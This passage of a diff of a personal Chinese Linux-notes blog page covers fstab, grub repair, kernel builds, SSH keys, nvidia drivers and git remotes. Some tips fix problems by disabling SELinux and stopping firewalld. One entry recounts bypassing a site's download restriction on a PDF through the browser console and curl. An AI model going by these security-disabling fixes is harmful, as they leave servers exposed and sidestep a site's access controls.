UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults	0 1</span><br><span class="line">UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults	0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa	/mnt/deepin-sda3 ext4  defaults  1   2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把<code>defaults</code>换成<code>nofail</code>还是相反，都没用</p>
+</li>
+<li><p>后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误</p>
+</li>
+</ul>
+<h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><ul>
+<li><p>一切正常</p>
+</li>
+<li><p>代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/sda8 during installation</span><br><span class="line">UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1</span><br><span class="line"># /boot/efi was on /dev/sda1 during installation</span><br><span class="line">UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1</span><br><span class="line"># swap was on /dev/sda4 during installation</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0</span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5  	    ntfs defaults	0 1</span><br><span class="line">UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults	0 1</span><br><span class="line">UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda9</span><br><span class="line">UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults	0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa	/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="mkfs-vfat了sda2那个efi分区结果deepin启动不了"><a href="#mkfs-vfat了sda2那个efi分区结果deepin启动不了" class="headerlink" title="mkfs.vfat了sda2那个efi分区结果deepin启动不了"></a>mkfs.vfat了sda2那个efi分区结果deepin启动不了</h3><ul>
+<li>情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。</li>
+<li>放弃，新装一个deepin 15.6，然后就会自动安装引导。</li>
+<li>搞定后，进原来那个deepin15.5还是失败，查看<code>journalctl -xb</code>，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。</li>
+<li>原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。</li>
+<li>后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M</li>
+</ul>
+<h3 id="编译内核-md"><a href="#编译内核-md" class="headerlink" title="编译内核.md"></a>编译内核.md</h3><h4 id="无openssl-bio-h"><a href="#无openssl-bio-h" class="headerlink" title="无openssl/bio.h"></a>无openssl/bio.h</h4><blockquote>
+<p>编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”</p>
+<p> “ #include &lt;openssl/bio.h&gt;”</p>
+<p>&lt;&lt;<------------------------------------>&gt;&gt;</------------------------------------></p>
+<p>解决方法: [ubuntu 16.10,64位主机]</p>
+<p><code>sudo apt install libssl-dev</code></p>
+</blockquote>
+<h3 id="记一次尝试下载-不允许下载的sinacloud的pdf"><a href="#记一次尝试下载-不允许下载的sinacloud的pdf" class="headerlink" title="记一次尝试下载 不允许下载的sinacloud的pdf"></a>记一次尝试下载 不允许下载的sinacloud的pdf</h3><ul>
+<li><p>获得页面源代码</p>
+</li>
+<li><p>在html搜索字符串next从而定位到逻辑代码</p>
+</li>
+<li><p>然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本</p>
+</li>
+<li><p>然后去chrome控制台使用以下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    script.innerHTML = <span class="string">"console.log(closePay)"</span><span class="comment">//括号内是要获得的函数名称;</span></span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败</p>
+</li>
+<li><p>直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）</p>
+</li>
+<li><p>查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice</p>
+</li>
+</ul>
+<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//request head</span><br><span class="line">http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: sinacloud.net</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh;q=0.9,zh-CN;q=0.8</span><br><span class="line"></span><br><span class="line">//从chrome复制的curl命令</span><br><span class="line">curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed</span><br></pre></td></tr></table></figure>
+<h3 id="查找并删除特定文件-md"><a href="#查找并删除特定文件-md" class="headerlink" title="查找并删除特定文件.md"></a>查找并删除特定文件.md</h3><p><a href="https://www.cnblogs.com/langzou/p/5959940.html" target="_blank" rel="noopener">来源</a><br>linux命令每日一练<br>linux中find与rm实现查找并删除目录或文件</p>
+<p>linux 下用find命令查找文件，rm命令删除文件。</p>
+<p>删除指定目录下指定文件<br>find 要查找的目录名 -name .svn |xargs rm -rf</p>
+<p>删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r</p>
+<p>分析：<br>find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录<br>| xargs rm -r 执行删除指令</p>
+<p>删除目录下所有exe文件</p>
+<p>find . -name ‘*.exe’ -type f -print -exec rm -rf {} ;</p>
+<p>(1) “.” 表示从当前目录开始递归查找</p>
+<p>(2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件</p>
+<p>(3) “ -type f “查找的类型为文件</p>
+<p>(4) “-print” 输出查找的文件目录名</p>
+<p>(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。<br>exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号</p>
+<h3 id="VPS上部署hexo"><a href="#VPS上部署hexo" class="headerlink" title="VPS上部署hexo"></a>VPS上部署hexo</h3><ul>
+<li><p><a href="https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/" target="_blank" rel="noopener">参考文章</a></p>
+</li>
+<li><p>遇到nginx 403，然后就关闭selinux</p>
+<blockquote>
+<p>1、临时关闭<br>setenforce 0 #设置SELinux 成为permissive模式</p>
+<h1 id="setenforce-1-设置SELinux-成为enforcing模式"><a href="#setenforce-1-设置SELinux-成为enforcing模式" class="headerlink" title="setenforce 1 设置SELinux 成为enforcing模式"></a>setenforce 1 设置SELinux 成为enforcing模式</h1><p>2、修改配置文件需要重启机器：</p>
+<p>修改/etc/selinux/config 文件</p>
+<p>将SELINUX=enforcing改为SELINUX=disabled</p>
+<p>重启机器即可</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="搭建ss服务器"><a href="#搭建ss服务器" class="headerlink" title="搭建ss服务器"></a>搭建ss服务器</h3><ul>
+<li>vps开了进程</li>
+<li>本地主机也如此</li>
+<li>但是提示[Errno 113] No route to host</li>
+<li>实在搞不明白——22端口可以用scp发文件过去vps</li>
+<li>所以用py写了个tcpclient、tcpserver，然后一运行也如此提示</li>
+<li>所以在vps运行<code>service firewalld stop</code></li>
+<li>其他关闭服务器防火墙的方法都不起作用，不知道问什么</li>
+</ul>
+<h3 id="VLC字幕"><a href="#VLC字幕" class="headerlink" title="VLC字幕"></a>VLC字幕</h3><p><a href="http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html" target="_blank" rel="noopener">链接</a></p>
+<h3 id="vbox的win7虚拟机无法使用usb"><a href="#vbox的win7虚拟机无法使用usb" class="headerlink" title="vbox的win7虚拟机无法使用usb"></a>vbox的win7虚拟机无法使用usb</h3><ul>
+<li><a href="https://blog.csdn.net/harry_helei/article/details/46972125" target="_blank" rel="noopener">引用自</a></li>
+<li>安装Virtualbox Extension Pack</li>
+<li>用户权限添加<ul>
+<li>添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）<code>sudo groupadd usbfs</code>   </li>
+<li>将你的linux常用用户添加到vboxusers、usbfs这个两个组中<code>sudo adduser kuein vboxusers</code>  <code>sudo adduser kuein usbfs</code> </li>
+<li>重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。</li>
+</ul>
+</li>
+</ul>
+<h3 id="Gnome-configure-md"><a href="#Gnome-configure-md" class="headerlink" title="Gnome-configure.md"></a>Gnome-configure.md</h3><h3 id="hide-title-bar"><a href="#hide-title-bar" class="headerlink" title="hide title bar"></a>hide title bar</h3><p><a href="https://extensions.gnome.org/extension/1267/no-title-bar/" target="_blank" rel="noopener">no-title-bar-extention</a></p>
+<h3 id="SSH-md"><a href="#SSH-md" class="headerlink" title="SSH.md"></a>SSH.md</h3><h4 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h4><ul>
+<li>本地用<code>ssh-keygen</code>生成一个秘钥——可以自定义储存的文件名</li>
+<li>把<code>id_rsa.pub</code>传送到vps上，<code>cat id_rsa.pug &gt; ~/.ssh/authorized_keys</code>，注意，这个命令会覆盖原有的<code>authorized_keys</code>内容</li>
+</ul>
+<h4 id="本地配置VPS别名"><a href="#本地配置VPS别名" class="headerlink" title="本地配置VPS别名"></a>本地配置VPS别名</h4><ul>
+<li><p>代码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; ~/.ssh/config &lt;&lt;EOF</span><br><span class="line">Host VultrVPS</span><br><span class="line">    User root</span><br><span class="line">    Hostname 217.163.11.0</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/VultrVPS_rsa</span><br><span class="line">    Port 22</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以上可实现使用秘钥 ，多个VPS可以依次增加配置</p>
+</li>
+</ul>
+<h3 id="Linux安装-md"><a href="#Linux安装-md" class="headerlink" title="Linux安装.md"></a>Linux安装.md</h3><h4 id="硬盘安装deepin"><a href="#硬盘安装deepin" class="headerlink" title="硬盘安装deepin"></a>硬盘安装deepin</h4><ul>
+<li><a href="http://bbs.iaixue.com/forum.php?mod=viewthread&amp;tid=1812" target="_blank" rel="noopener">来源</a></li>
+</ul>
+<blockquote>
+<p>将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123;</span><br><span class="line">        echo &apos;booting...&apos;</span><br><span class="line">        set isofile=/deepin-15.5-amd64.iso</span><br><span class="line">        search --file $isofile --set=root</span><br><span class="line">        loopback loop $isofile</span><br><span class="line">        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync</span><br><span class="line">        initrd (loop)/live/initrd.lz</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="刻录U盘安装Fedora或Centos"><a href="#刻录U盘安装Fedora或Centos" class="headerlink" title="刻录U盘安装Fedora或Centos"></a>刻录U盘安装Fedora或Centos</h4><ul>
+<li>win下使用PowerISO刻录</li>
+<li>使用简单的dd命令<code>dd if=xxx of=xxx bs=xx</code>失败</li>
+<li>使用Ultraiso失败</li>
+</ul>
+<h4 id="U盘grub引导多个linux镜像安装"><a href="#U盘grub引导多个linux镜像安装" class="headerlink" title="U盘grub引导多个linux镜像安装"></a>U盘grub引导多个linux镜像安装</h4><ul>
+<li><a href="https://my.oschina.net/abcfy2/blog/491140" target="_blank" rel="noopener">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式</a>。文中提供的deepin的那个grub配置无效</li>
+<li><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=150783" target="_blank" rel="noopener">使用grub2制作启动U盘</a>，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败<br><img src="./LinuxInstall_1.jpg" alt="错误信息"></li>
+</ul>
+<h3 id="OSC提供的代码make不过"><a href="#OSC提供的代码make不过" class="headerlink" title="OSC提供的代码make不过"></a>OSC提供的代码make不过</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source code 9th/final-src-osc9e/ch2 </span><br><span class="line">➜ make                                                             </span><br><span class="line">make -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules</span><br><span class="line"><span class="section">make[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">arch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support</span></span><br><span class="line"><span class="section">make[3]: *** No rule to make target 'code'.  Stop.</span></span><br><span class="line"><span class="section">Makefile:150: recipe for target 'sub-make' failed</span></span><br><span class="line"><span class="section">make[2]: *** [sub-make] Error 2</span></span><br><span class="line"><span class="section">Makefile:8: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make[1]: *** [all] Error 2</span></span><br><span class="line"><span class="section">make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'</span></span><br><span class="line"><span class="section">Makefile:3: recipe for target 'all' failed</span></span><br><span class="line"><span class="section">make: *** [all] Error 2</span></span><br></pre></td></tr></table></figure>
+<p>解决方法，把source code 9th这个文件名的空格去掉</p>
+<h3 id="vim-dos-unix"><a href="#vim-dos-unix" class="headerlink" title="vim dos unix"></a>vim dos unix</h3><ul>
+<li>如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。</li>
+</ul>
+<h3 id="删除文件名以-开头的文件"><a href="#删除文件名以-开头的文件" class="headerlink" title="删除文件名以-开头的文件"></a>删除文件名以<code>-</code>开头的文件</h3><ul>
+<li>比如删除<code>-a</code>：<code>rm -- -a</code></li>
+</ul>
+<h3 id="文件的change，modification时间"><a href="#文件的change，modification时间" class="headerlink" title="文件的change，modification时间"></a>文件的change，modification时间</h3><ul>
+<li>以下来自于实验：change是修改属性，比如<code>touch -d 1111 filename</code>，modification是修改内容</li>
+</ul>
+<h3 id="ctags-注意事项"><a href="#ctags-注意事项" class="headerlink" title="ctags 注意事项"></a>ctags 注意事项</h3><ul>
+<li>如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效</li>
+</ul>
+<h3 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h3><ul>
+<li><code>watch -n 0.1 ./a.o</code> 与<code>watch ./a.o -n 0.1</code>的区别是前者<code>-n 0.1</code>是watch的参数，后者是<code>./a.o</code>的参数</li>
+</ul>
+<h3 id="修复light-display-manger失败"><a href="#修复light-display-manger失败" class="headerlink" title="修复light display manger失败"></a>修复light display manger失败</h3><ul>
+<li>通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败</li>
+<li>搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面</li>
+<li>就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install –reinstall dde修复了dde的安装（apt -f在这里是没用的）</li>
+<li>不知道为什么中途提示proxychain 的配置文件修改了</li>
+<li>本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。</li>
+<li>后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期</li>
+</ul>
+<h3 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h3><ul>
+<li><code>ldd --version</code></li>
+<li><code>getconf GNU_LIBC_VERSION</code></li>
+</ul>
+<h3 id="shell使用-时的SIGPIPE"><a href="#shell使用-时的SIGPIPE" class="headerlink" title="shell使用|时的SIGPIPE"></a>shell使用<code>|</code>时的SIGPIPE</h3><ul>
+<li>比如<code>proc_1 | proc_2</code>，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die</li>
+</ul>
+<h3 id="安装nvidia驱动"><a href="#安装nvidia驱动" class="headerlink" title="安装nvidia驱动"></a>安装nvidia驱动</h3><ul>
+<li>在nvidia官网下程序</li>
+<li><code>telinit 3</code>关掉<code>X server</code>（或者是systemctl stop lightdm.service）</li>
+<li><p>安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/version</span><br><span class="line">Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装时，如果有驱动占用了gpu，那么会失败，在<code>/etc/modprobe.d/</code>加一个文件（命名为<code>*.conf</code>）</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">blacklist rivafb</span><br><span class="line">blacklist rivatv</span><br><span class="line">blacklist nvidiafb</span><br><span class="line"></span><br><span class="line"># 下面这几条应该可以不用，我不加也成功</span><br><span class="line">options nouveau modeset=0 </span><br><span class="line">options rivafb modeset=0</span><br><span class="line">options rivatv modeset=0</span><br><span class="line">options nvidiafb modeset=0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况</p>
+</li>
+<li>安装后要运行<code>nvidia-xconfig</code>配置<code>/etc/X11/xorg.conf</code>，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）</li>
+<li>然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist</li>
+<li>后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行</li>
+</ul>
+<h3 id="Tilix-dont-inherit-the-directory"><a href="#Tilix-dont-inherit-the-directory" class="headerlink" title="Tilix dont inherit the directory"></a>Tilix dont inherit the directory</h3><ul>
+<li><a href="https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue" target="_blank" rel="noopener">The VTE matter this</a></li>
+</ul>
+<h3 id="sogouPinyin候选框异常解决方法"><a href="#sogouPinyin候选框异常解决方法" class="headerlink" title="sogouPinyin候选框异常解决方法"></a>sogouPinyin候选框异常解决方法</h3><ul>
+<li>其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了<code>~/.config</code>下面的sogou相关配置文件也没用</li>
+<li>后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）</li>
+</ul>
+<h3 id="cache的详细信息（包括相联度，电压等）"><a href="#cache的详细信息（包括相联度，电压等）" class="headerlink" title="cache的详细信息（包括相联度，电压等）"></a>cache的详细信息（包括相联度，电压等）</h3><ul>
+<li><code>sudo dmidecode -t 7</code></li>
+<li><code>getconf -a | grep CACHE</code></li>
+</ul>
+<h3 id="设置默认浏览器"><a href="#设置默认浏览器" class="headerlink" title="设置默认浏览器"></a>设置默认浏览器</h3><ul>
+<li><code>xdg-settings set default-web-browser chrome.desktop</code></li>
+<li><code>xdg-settings get default-web-browser</code>获取值</li>
+<li>关于desktop文件的<code>Exec</code>段中的后缀，<a href="https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html" target="_blank" rel="noopener">doc</a><blockquote>
+<p>%i    The Icon key of the desktop entry expanded as two arguments, first –icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.<br>%c    The translated name of the application as listed in the appropriate Name key in the desktop entry.<br>%k    The location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.<br>%f    A single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.<br>%F    A list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.<br>%u    A single URL. Local files may either be passed as file: URLs or as file path.<br>%U    A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="github账户有设置ssh但是仓库push还是要用户密码的解决方法"><a href="#github账户有设置ssh但是仓库push还是要用户密码的解决方法" class="headerlink" title="github账户有设置ssh但是仓库push还是要用户密码的解决方法"></a>github账户有设置ssh但是仓库push还是要用户密码的解决方法</h3><ul>
+<li>这是因为remote add时使用的是https，而不是ssh</li>
+<li><code>git remote -v</code>可以看到是https链接</li>
+<li><code>git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>改为ssh</li>
+<li><a href="https://help.github.com/articles/changing-a-remote-s-url/" target="_blank" rel="noopener">参考</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-02-02T06:17:42.098Z" itemprop="dateUpdated">2019-02-02 14:17:42</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://h-zex.github.io">
+            <img src="/img/avatar.jpg" alt="H-ZeX">
+            H-ZeX
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GF2n/">GF2n</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&title=《GF 2^n上算术运算的实现》 — H-ZeX&pic=https://h-zex.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/&title=《GF 2^n上算术运算的实现》 — H-ZeX&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://h-zex.github.io/2018/10/18/My-ITOPS-Note/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
